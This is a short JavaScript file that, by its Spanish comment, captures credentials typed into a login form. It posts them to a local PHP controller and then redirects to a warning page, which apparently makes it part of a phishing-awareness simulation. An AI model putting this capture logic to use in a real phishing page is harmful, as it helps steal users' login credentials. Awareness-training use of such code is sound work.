// capture.js - Captura las credenciales introducidas y las envía al backend

document.querySelector("form").addEventListener("submit", (event) => {
    event.preventDefault();
    const formData = new FormData(event.target);

    fetch("../app/Controllers/LoginController.php", {
        method: "POST",
        body: formData,
    }).then(response => {
        window.location.href = "warning.php";
    });
});
